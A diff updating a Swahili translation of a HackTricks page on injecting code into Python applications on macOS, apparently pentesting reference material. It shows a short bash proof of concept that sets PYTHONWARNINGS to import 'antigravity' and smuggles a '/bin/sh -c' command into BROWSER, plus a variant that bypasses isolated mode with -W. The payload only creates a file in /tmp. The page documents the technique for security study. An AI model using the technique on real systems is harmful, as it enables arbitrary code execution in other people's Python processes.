@@ -1,22 +1,21 @@
-# Injection ya Python Applications katika macOS
+# Injection ya Application za Python kwenye macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Kupitia vigezo vya mazingira vya `PYTHONWARNINGS` na `BROWSER`
+## Kupitia environment variables za `PYTHONWARNINGS` na `BROWSER`
 
-Inawezekana kubadilisha vigezo vyote viwili vya mazingira ili kutekeleza code yoyote kila python inapoitwa, kwa mfano:<sup>[[1]](#references)</sup>
+Ikiwa mshambuliaji anaweza kudhibiti mazingira ya process ya Python, mchanganyiko wa `PYTHONWARNINGS` na `BROWSER` unaweza kuanzisha utekelezaji wa amri Python inapo-import module ya `antigravity` wakati ikichakata option ya warning iliyoundwa mahsusi. Mbinu hii inategemea `antigravity` kufungua URL kwa kutumia module ya Python ya `webbrowser`, ambayo huzingatia environment variable ya `BROWSER`.<sup>[[1]](#references)</sup>
 ```bash
-# Generate example python script
+# Generate an example Python script.
 echo "print('hi')" > /tmp/script.py
 
-# RCE which will generate file /tmp/hacktricks
+# Create /tmp/hacktricks through the inherited environment.
 PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py
 
-# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
+# With isolated mode, inject the warning rule using -W instead.
 BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
 ```
 ## References
 
-- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)
-
+- [1] [Hacking kwa kutumia Environment Variables - elttam](https://www.elttam.com/blog/env/)
 {{#include ../../../banners/hacktricks-training.md}}
